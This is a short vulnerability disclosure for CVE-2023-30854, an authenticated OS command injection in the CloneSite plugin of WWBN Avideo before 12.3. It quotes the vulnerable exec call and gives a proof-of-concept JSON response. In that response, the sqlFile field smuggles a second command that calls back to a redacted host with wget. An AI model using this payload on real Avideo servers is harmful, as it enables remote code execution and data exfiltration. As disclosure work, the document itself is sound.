# WWBN Avideo Authenticated RCE - OS Command Injection

**CVE-2023-30854 WWBN Avideo < 12.3 Authenticated RCE**

An OS Command Injection vulnerability in an Authenticated endpoint `/plugin/CloneSite/cloneClient.json.php` allows attackers to achieve Remote Code Execution.


Vulnerable code:

```php
$cmd = "wget -O {$clonesDir}{$json->sqlFile} {$objClone->cloneSiteURL}videos/cache/clones/{$json->sqlFile}";
$log->add("Clone (2 of {$totalSteps}): Geting MySQL Dump file");
exec($cmd . " 2>&1", $output, $return_val);
```

We can control `$objClone->cloneSiteURL`  through the admin panel clone site feature.

`/plugin/CloneSite/cloneClient.json.php` sends a GET Request to `{$objClone->cloneSiteURL}/plugin/CloneSite/cloneServer.json.php`. I hosted a  specially crafted `cloneServer.json.php` that prints the following JSON data

```JSON
{"error":false,"msg":"","url":"https:\/\/REDACTED/\/","key":"REDACTED","useRsync":1,"videosDir":"\/var\/www\/html\/demo.avideo.com\/videos\/","sqlFile":"Clone_mysqlDump_644ab263e62d6.sql; wget http://REDACTED:4444/`pwd` ;#","videoFiles":[],"photoFiles":[]}
```

Send a GET Request to `/plugin/CloneSite/cloneClient.json.php` then remote code execution is achieved.

![rce](https://i.ibb.co/h14gQtn/rce.png)

## Credits
- JM Sanchez
- https://www.linkedin.com/in/juanmarcosanchez/
